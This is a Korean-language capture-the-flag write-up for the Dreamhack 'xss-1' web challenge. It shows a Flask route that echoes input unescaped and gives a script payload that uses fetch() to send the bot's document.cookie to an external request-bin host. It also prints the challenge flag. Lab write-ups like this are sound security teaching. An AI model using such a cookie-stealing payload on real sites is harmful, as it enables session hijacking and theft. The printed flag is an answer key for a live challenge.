---
ctf_name: "Dreamhack"
challenge_name: "xss-1"
category: "web"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "inhwan689"
date: "2026-08-25"
points: 0
tags: [xss]
---

# 문제명

## 문제 설명

> 문제에서 주어진 설명을 여기에 작성합니다.

- 여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다.
  XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.
  플래그 형식은 DH{...} 입니다.

## 풀이

### 분석

아주 간단한 서비스로, flag, memo엔드 포인트가 있으며, memo로 들어갈 시, url창에 query창이 나오며, alert로 1이 출력된다. flag 엔드포인트에서는 서버 봇의 로컬 호스트로 GET 요청을 보낼 수 있으며, memo와 같이<script>문을 넣을시 그대로 실행된다.

소스 코드를 확인하면 /vuln 엔드포인트에서 param이라는 파라미터를 별도의 필터링 없이 그대로 반환하고 있다.

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```

### 취약점

XSS 취약점이 서버에서 바로 발견 되었고, flag엔드포인트에서도 js문이 필터링 없이 memo와 같이 실행되었다.

### 익스플로잇

1. /flag에 XSS 페이로드를 입력한다.
2. 서버는 check_xss()를 통해 Selenium 봇을 실행한다.
3. 봇은 flag 쿠키를 설정한 후 /vuln에 접속한다.
4. /vuln에서 XSS가 실행되면서 document.cookie를 읽는다.
5. 읽은 쿠키 값을 외부 Request Bin으로 전송한다.

```javascript
<script>
fetch("https://gscmbav.request.dreamhack.games/?cookie=" + encodeURIComponent(document.cookie));
</script>
```

## 플래그

```
DH{2c01577e9542ec24d68ba0ffb846508e}
```

## 배운 점

사용자 입력을 HTML에 출력할 때 적절한 escaping이나 검증을 수행하지 않으면 XSS 취약점이 발생할 수 있다는 것을 배웠다.
